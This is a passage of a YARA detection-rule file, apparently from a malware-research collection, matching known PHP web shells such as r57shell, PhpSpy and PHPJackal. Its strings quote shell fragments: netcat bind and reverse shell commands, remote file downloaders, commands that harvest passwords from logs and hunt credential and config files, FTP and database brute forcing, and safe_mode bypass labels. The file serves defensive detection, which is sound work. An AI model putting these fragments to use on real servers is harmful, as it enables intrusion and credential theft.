      $x14 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)'," fullword ascii
      $x15 = "elseif(@file_exists($_POST['e_name'])) {$filedump = 'NONE'; if(!@is_writable($_POST['e_name'])) { $only_read = 1; };}" fullword ascii
      $x16 = "$_POST['cmd'] = which('curl').\" \\\"\".$_POST['rem_file'].\"\\\" -o \\\"\".$_POST['loc_file'].\"\\\"\";" fullword ascii
      $x17 = "OST['test15_file2'])?($_POST['test15_file2']):($dir.\"shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15'));" fullword ascii
      $x18 = "OST['test13_file2'])?($_POST['test13_file2']):($dir.\"shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13'));" fullword ascii
      $x19 = "$_POST['cmd'] = which('fetch').\" -p \\\"\".$_POST['rem_file'].\"\\\" -o \\\"\".$_POST['loc_file'].\"\\\"\";" fullword ascii
      $x20 = "echo sr(10,\"\",$fs.in('hidden','cmd',0,'dos32').in('submit','submit',0,'BoF [php_iisfunc.dll](PHP<5.2.x)').$fe);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _PHPSPY_PhpSpyVer2006_phpspy_2006_PhpSpy_Ver_2006_10
{
   meta:
      description = "php22 - from files PHPSPY.php, PhpSpyVer2006.php, phpspy_2006.php, PhpSpy_Ver_2006.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e349d8a219a43f3dd1339ec5ca39764956401f3820b5000fe25ff18845edff29"
      hash2 = "cdb2650f3e0f6e7e2bc112329f142c9171c953ba62f849f3f16a0f65ec9a8e6f"
      hash3 = "b0a12e6daee4649ae1ee375c6b6fde658add204d0d521bc208906385d83036e3"
      hash4 = "b0dcae77eabc407c53c0b2b6fe74d0749bc2fa4fd9a560b40400a64d2959492c"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x3 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x4 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s5 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s6 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s7 = ": '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));" fullword ascii
      $s8 = "echo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>" fullword ascii
      $s9 = "$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'" fullword ascii
      $s10 = "37 => array(\"FTP\",getfun(\"ftp_login\"))," fullword ascii
      $s11 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";" fullword ascii
      $s12 = "$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);" fullword ascii
      $s13 = "$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'" fullword ascii
      $s14 = "$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';" fullword ascii
      $s15 = "if ($_POST['do'] == 'login') {" fullword ascii
      $s16 = ": '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' " fullword ascii
      $s17 = "$proxycontents = @file_get_contents($_POST['url']);" fullword ascii
      $s18 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {" fullword ascii
      $s19 = "echo \" <form action=\\\"$action\\\" method=\\\"POST\\\"\".$target.\">\\n\";" fullword ascii
      $s20 = "echo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PHPJackal_v1_5_phpjackal1_3_PHPJackalkv1_5_PHPJackalv1_5_phpjackal_2_PHPJackal_v1_5_PHPJackal_v1_9_11
{
   meta:
      description = "php22 - from files PHPJackal v1.5.php, phpjackal1.3.php, PHPJackalkv1.5.php, PHPJackalv1.5.php, phpjackal_2.php, PHPJackal_v1.5.php, PHPJackal_v1.9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ed597809fdcb90dabc0a555c39353982bae3c99703b81938a6e19923d0a75692"
      hash2 = "6d5d8b5a07ffd074de611ecbbed94b2e2afde1240e856a5ac692e8856de3d1e9"
      hash3 = "121877e751bb92c4042c226da4f1ffa428c5eebf9d43e3dce517b962890a3607"
      hash4 = "34df5c5ca0e3e1160a5849ddcca1375cd5d4eb7adb39f65cb0fa7eb520f169ac"
      hash5 = "f2b8d0d0eb8717ee5c4e0daf1bd09bf6b4e2e1cc02c49ed223688d1a369f1236"
      hash6 = "25c54b4fb107d0a730e1bc2f30924bff05b588419479b50b193e7d13178b69fd"
      hash7 = "17358a5e241aeca2997096e858b96ce10fd9015ceefc14ea6bebfc6778bc4abc"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $s3 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $s4 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $s5 = "fputs($sock,\"RCPT TO: <contact@persianblog.com>\\r\\n\");" fullword ascii
      $s6 = "if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));" fullword ascii
      $s7 = "spliturL($_REQUEST['target'],$host,$page);" fullword ascii
      $s8 = "function shelL($command){" fullword ascii
      $s9 = "elseif(!empty($_REQUEST['rport']) && ($_REQUEST['rport']<=65535) && ($_REQUEST['rport']>=1) && !empty($_REQUEST['ip'])){" fullword ascii
      $s10 = "if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){" fullword ascii
      $s11 = "header(\"Content-disposition: attachment; filename=\\\"$dl\\\";\");" fullword ascii
      $s12 = "$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');" fullword ascii
      $s13 = "fputs($sock,\"$b LOGIN $username $password\\r\\n\");" fullword ascii
      $s14 = "tr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}" fullword ascii
      $s15 = "</head><body text=\"#E2E2E2\" bgcolor=\"#C0C0C0\" link=\"#DCDCDC\" vlink=\"#DCDCDC\" alink=\"#DCDCDC\">" fullword ascii
      $s16 = "if($fo || $fo=='on')$con=file_get_contents($get);" fullword ascii
      $s17 = "if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password))die(\"<html><body><table><form method=post><tr><td>Passwo" ascii
      $s18 = "cal/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');" fullword ascii
      $s19 = "$res=snmpchecK($target,$com,2);" fullword ascii
      $s20 = "$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57_bd_r57shell_v_1_42_edited_by_kibngdefacer_12
{
   meta:
      description = "php22 - from files r57-bd.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash2 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $x1 = "'tar -czvf all.tgz -T '.$tempdir.'grep.txt'=>'tar -czvf all.tgz -T '.$tempdir.'grep.txt'," fullword ascii
      $s2 = "'find *dump* files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'find / -type f -name \"*dump*\" >> '.$tempdir.'grep.txt;c" ascii
      $s3 = "'find *dump* files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'find / -type f -name \"*dump*\" >> '.$tempdir.'grep.txt;c" ascii
      $s4 = "'cat /var/log/httpd/auth_log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/auth_log | grep " ascii
      $s5 = "'cat /var/log/httpd/error.log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/error.log | gre" ascii
      $s6 = "'cat /var/log/httpd/access.log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/access.log | g" ascii
      $s7 = "'cat /var/log/httpd/auth.log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/auth.log | grep " ascii
      $s8 = "'cat /var/log/httpd/error_log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/error_log | gre" ascii
      $s9 = "'cat /var/log/httpd/error_log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/error_log | gre" ascii
      $s10 = "'cat /var/log/httpd/error.log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/error.log | gre" ascii
      $s11 = "'cat /var/log/httpd/access_log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/access_log | g" ascii
      $s12 = "'cat /var/log/httpd/auth_log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/auth_log | grep " ascii
      $s13 = "'cat /var/log/httpd/auth.log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/auth.log | grep " ascii
      $s14 = "'cat /var/log/httpd/access_log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/access_log | g" ascii
      $s15 = "'cat /var/log/httpd/access.log | grep pass >> '.$tempdir.'pass.txt;cat '.$tempdir.'pass.txt'=>'cat /var/log/httpd/access.log | g" ascii
      $s16 = "$select_downloaders = $_COOKIE['select_downloaders'];" fullword ascii
      $s17 = "'locate dump files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'locate dump >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep." ascii
      $s18 = "'locate dump files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'locate dump >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep." ascii
      $s19 = "setcookie('select_downloaders',$select_downloaders);" fullword ascii
      $s20 = "$downloader = trim($_COOKIE['downloader']);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57_bd_r57shell1_40_r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b_r57shell_v_1_42_edited_by_kibngdefacer_13
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57-bd.php, r57shell1.40.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash4 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash5 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $x1 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x2 = "ox','dif id=dif',0,'1').in('text','dif_name',17,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $x3 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').in('hidden','dir',0,$dir));" fullword ascii
      $s4 = "echo sr(10,\"\",$fs.in('hidden','cmd',0,'dos8').in('submit','submit',0,'Apache process killer').$fe);" fullword ascii
      $s5 = "@move_uploaded_file($HTTP_POST_FILES['userfile'.$upl]['tmp_name'],$_POST['dir'].\"/\".$nfn)" fullword ascii
      $s6 = "echo sr(40,\"<b>\".$lang[$language.'_text24'].$arrow.\"</b>\",in('text','remote_host',10,'irc.dalnet.ru'));" fullword ascii
      $s7 = "{$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/syslog.conf';}" fullword ascii
      $s8 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s9 = "$extra = \"-C \".$_POST['test5_file'].\" -X $temp\";" fullword ascii
      $s10 = "{$_POST['cmd'] = 'service --status-all';}" fullword ascii
      $s11 = "):(\"mysql\"))).' <b>.</b> '.in('text','mysql_tbl',8,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"))));" fullword ascii
      $s12 = "{$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/hosts';}" fullword ascii
      $s13 = "echo sr(10,\"\",$fs.in('hidden','cmd',0,'dos1').in('submit','submit',0,'Recursive memory exhaustion').$fe);" fullword ascii
      $s14 = "{$_POST['cmd'] = 'last -n 10';}" fullword ascii
      $s15 = "{$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/issue.net';}" fullword ascii
      $s16 = "$str = readzlib($_POST['test8_file1'],$temp);" fullword ascii
      $s17 = "if($_POST['cmd']==\"ftp_brute\"){@ftp_close($connection);}" fullword ascii
      $s18 = "{$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/passwd';}" fullword ascii
      $s19 = "else echo ws(3).\"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid().\"<br>\";" fullword ascii
      $s20 = "st8_file1']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57shell1_40_r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b_14
{
   meta:
      description = "php22 - from files r57shell1.40.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash2 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
   strings:
      $x1 = "'find *dump* files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name \"*dump*\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x2 = "'locate dump files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate dump >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x3 = "'locate error_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate error_log >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x4 = "'locate error.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate error.log >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x5 = "OST['test15_file2'])?($_POST['test15_file2']):($dir.\"/shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15'));" fullword ascii
      $x6 = "OST['test13_file2'])?($_POST['test13_file2']):($dir.\"/shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13'));" fullword ascii
      $x7 = "'locate proftpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate proftpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x8 = "'locate access.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate access.log >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x9 = "'locate vhosts.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate vhosts.conf >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x10 = "'locate \".log\" files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate \".log\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x11 = "'locate access_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate access_log >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s12 = "'locate .htpasswd files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate \".htpasswd\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s13 = "'locate httpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate httpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s14 = "'locate .bash_history files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate \".bash_history\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s15 = "'locate config.inc.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate config.inc.php >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s16 = "@fwrite($file,$_POST['e_text']) or @fputs($file,$_POST['e_text']) or @file_put_contents($_POST['e_name'],$_POST['e_text']);" fullword ascii
      $s17 = "'find *.pwd files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name \"*.pwd\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s18 = "'find *.sql files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name \"*.sql\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s19 = "'find conf.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name conf.php >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $s20 = "'find cfg.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name cfg.php >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _phpjackal1_3_r57_bd_15
{
   meta:
      description = "php22 - from files phpjackal1.3.php, r57-bd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6d5d8b5a07ffd074de611ecbbed94b2e2afde1240e856a5ac692e8856de3d1e9"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
   strings:
      $s1 = "fF7eSD8[0]=\"%3Cscript%3E%0Adocu\";" fullword ascii
      $s2 = "fF7eSD8[246]=\"29%253C/script%25\";" fullword ascii
      $s3 = "fF7eSD8[247]=\"3E%22%29%29%3B%0A%3C/scri\";" fullword ascii
      $s4 = "fF7eSD8[101]=\"Cu0030%255Cu00\";" fullword ascii
      $s5 = "fF7eSD8[191]=\"%255Cu0065%255Cu\";" fullword ascii
      $s6 = "fF7eSD8[156]=\"30%255Cu0036%255Cu\";" fullword ascii
      $s7 = "fF7eSD8[88]=\"05c%255Cu0075%255C\";" fullword ascii
      $s8 = "fF7eSD8[24]=\"72%255Cu0069%25\";" fullword ascii
      $s9 = "fF7eSD8[140]=\"0%255Cu0033%255C\";" fullword ascii
      $s10 = "fF7eSD8[111]=\"%255Cu0075%255Cu\";" fullword ascii
      $s11 = "fF7eSD8[85]=\"5Cu0030%255Cu003\";" fullword ascii
      $s12 = "fF7eSD8[176]=\"Cu005c%255Cu007\";" fullword ascii
      $s13 = "fF7eSD8[234]=\"%255Cu0034%255Cu0\";" fullword ascii
      $s14 = "fF7eSD8[184]=\"5c%255Cu0075%255\";" fullword ascii
      $s15 = "fF7eSD8[79]=\"4%255Cu0033%255Cu\";" fullword ascii
      $s16 = "fF7eSD8[245]=\"4%255Cu003e%2527%25\";" fullword ascii
      $s17 = "fF7eSD8[151]=\"Cu0030%255Cu00\";" fullword ascii
      $s18 = "fF7eSD8[227]=\"05c%255Cu0075%25\";" fullword ascii
      $s19 = "fF7eSD8[164]=\"5Cu0037%255Cu00\";" fullword ascii
      $s20 = "fF7eSD8[215]=\"Cu005c%255Cu007\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976_16
{
   meta:
      description = "php22 - from files r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash2 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
   strings:
      $x1 = "'tur_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $s2 = "$text['tur'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s3 = "or print(\"<font color=orange face=Fixedsys><div align=center>Malesef gulum Buraya Y&#252;kleyemezsin \".$HTTP_POST_FILES['u" fullword ascii
      $s4 = "'tur_text99'=>'* kullanici isimlerinde /etc/passwd for ftp Giris ve sifre'," fullword ascii
      $s5 = "'tur_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s6 = "'tur_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s7 = "lace.org\"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));" fullword ascii
      $s8 = "'tur_text114'=>'Test bypass safe_mode, view file contest via imap_body'," fullword ascii
      $s9 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95" fullword ascii
      $s10 = "if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><" fullword ascii
      $s11 = "lace.org\"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));" fullword ascii
      $s12 = "'tur_text112'=>'Test bypass safe_mode with function mb_send_mail'," fullword ascii
      $s13 = "'tur_text113'=>'Test bypass safe_mode, view dir list via imap_list'," fullword ascii
      $s14 = "'tur_text33'=>'Test bypass open_basedir with cURL functions'," fullword ascii
      $s15 = "'tur_text34'=>'Test bypass safe_mode with include function'," fullword ascii
      $s16 = "'tur_text35'=>'Test bypass safe_mode with load file in mysql'," fullword ascii
      $s17 = "else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><fon" ascii
      $s18 = "$keys = @implode(\"&nbsp;</b></font></td><td bgcolor=#396D95><font face=Verdana size=-2><b>&nbsp;\", $sql->columns);" fullword ascii
      $s19 = "echo '<font color=#BF0F0F><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';" fullword ascii
      $s20 = "'tur_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57_bd_r57shell1_40_r57shell_v_1_42_edited_by_kibngdefacer_17
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57-bd.php, r57shell1.40.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash4 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x2 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x3 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x4 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x5 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail_bomber\" && !empty($_POST['mail_flood']) && !empty($_POST['mail_size']))" fullword ascii
      $x6 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }" fullword ascii
      $x7 = "'eng_text123'=>'Test bypass open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)'," fullword ascii
      $s8 = "if($sql->connect()) { echo \"[+] $user:\".strrev($user).\" - success\\r\\n\"; $suc++; }" fullword ascii
      $s9 = "if($sql->connect()) { echo \"[+] \".$_POST['mysql_l'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s10 = "'eng_text130'=>'Test bypass open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)'," fullword ascii
      $s11 = "}else if(($_POST['brute_method']=='dic') && isset($_POST['ftp_login'])){" fullword ascii
      $s12 = "echo \" Server IP: [<font color=blue>\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\"</font>]\";" fullword ascii
      $s13 = "if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }" fullword ascii
      $s14 = "'eng_text126'=>'Test bypass open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)'," fullword ascii
      $s15 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);}" fullword ascii
      $s16 = "if(!empty($_POST['cmd']) && (($_POST['cmd']==\"ftp_file_up\") || ($_POST['cmd']==\"ftp_file_down\")))" fullword ascii
      $s17 = "'eng_text131'=>'Test bypass open_basedir, view file contest via symlink() (PHP <= 5.2.1)'," fullword ascii
      $s18 = "if(!empty($_POST['cmd']) && (($_POST['cmd']==\"ftp_brute\") || ($_POST['cmd']==\"db_brute\")))" fullword ascii
      $s19 = "'eng_text33'=>'Test bypass open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)'," fullword ascii
      $s20 = "'eng_err4'=>'Error! Can\\'t login on ftp server'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57_bd_r57shell1_40_r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b_r57Shell_b16fdf4a3fc21892dcf5f69f802dbd92_18
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57-bd.php, r57shell1.40.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57Shell_b16fdf4a3fc21892dcf5f69f802dbd928642b5a4.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash4 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash5 = "71a6b712bed415a8bbfc02e006904d63dca15e0c778f607888e776bc9df700db"
      hash6 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $x1 = "$res = '[~] Blind Command Execution via [pcntl_exec]\\n\\n';" fullword ascii
      $s2 = "$str = @file_get_contents($temp);" fullword ascii
      $s3 = "@shell_exec(\"killall -11 httpd\");" fullword ascii
      $s4 = "$r = @mysql_query(\"SELECT * FROM temp_r57_table\");" fullword ascii
      $s5 = "2147483649" ascii
      $s6 = "@mysql_query(\"CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL )\");" fullword ascii
      $s7 = "document.getElementById(id).style.display = \\'block\\';" fullword ascii
